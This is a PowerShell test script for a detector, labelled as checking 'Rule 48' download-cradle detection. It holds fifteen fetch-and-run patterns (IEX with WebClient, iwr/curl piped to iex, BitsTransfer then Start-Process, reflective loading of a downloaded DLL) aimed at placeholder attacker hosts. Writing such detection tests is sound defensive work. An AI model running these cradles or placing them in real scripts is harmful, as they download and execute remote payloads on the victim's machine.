# PowerShield Test Script: Download Cradle Detection
# This script contains intentional download cradle patterns for testing Rule 48
# MITRE ATT&CK: T1105 (Ingress Tool Transfer), T1059.001 (PowerShell), T1204.002 (Malicious File)

# Test 1: Classic IEX download cradle (Critical)
IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')

# Test 2: WebClient DownloadData with execution (Critical)
$data = (New-Object System.Net.WebClient).DownloadData('http://evil.example.com/script')
Invoke-Expression ([System.Text.Encoding]::ASCII.GetString($data))

# Test 3: WebClient DownloadFile (High - not immediate execution)
(New-Object Net.WebClient).DownloadFile('http://suspicious.example.com/tool.exe', 'C:\Temp\tool.exe')

# Test 4: Invoke-WebRequest piped to IEX (Critical)
Invoke-WebRequest -Uri 'http://attacker.example.com/payload' | IEX

# Test 5: Invoke-RestMethod with IEX (Critical)
Invoke-RestMethod 'http://c2.example.com/cmd.ps1' | Invoke-Expression

# Test 6: iwr alias piped to iex (Critical)
iwr http://bad.example.com/script.ps1 | iex

# Test 7: BitsTransfer followed by execution (Critical)
Start-BitsTransfer -Source 'http://malware.example.com/backdoor.exe' -Destination 'C:\Temp\backdoor.exe'
Start-Process 'C:\Temp\backdoor.exe'

# Test 8: BitsTransfer with Invoke-Item (Critical)
Import-BitsTransfer -Source 'http://evil.com/payload.ps1' -Destination 'C:\Temp\payload.ps1'
Invoke-Item 'C:\Temp\payload.ps1'

# Test 9: Assembly loading from web (Critical)
[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://attacker.com/evil.dll'))

# Test 10: Assembly LoadFile from downloaded content (Critical)
$bytes = (New-Object System.Net.WebClient).DownloadData('http://c2.example.com/assembly.dll')
[System.Reflection.Assembly]::Load($bytes)

# Test 11: Content property access (High)
$response = Invoke-WebRequest -Uri 'http://malicious.example.com/data'
$content = $response.Content
Invoke-Expression $content

# Test 12: wget alias with execution (Critical)
wget http://attacker.example.com/evil.ps1 -OutFile payload.ps1
. .\payload.ps1

# Test 13: curl alias with IEX (Critical)
curl http://bad.example.com/script | iex

# Test 14: DownloadString without execution (High)
$script = (New-Object Net.WebClient).DownloadString('http://example.com/check.ps1')

# Test 15: BitsTransfer without immediate execution (Medium - still suspicious)
Start-BitsTransfer -Source 'http://updates.example.com/file.zip' -Destination 'C:\Downloads\file.zip'

Write-Host "Download cradle detection test complete"
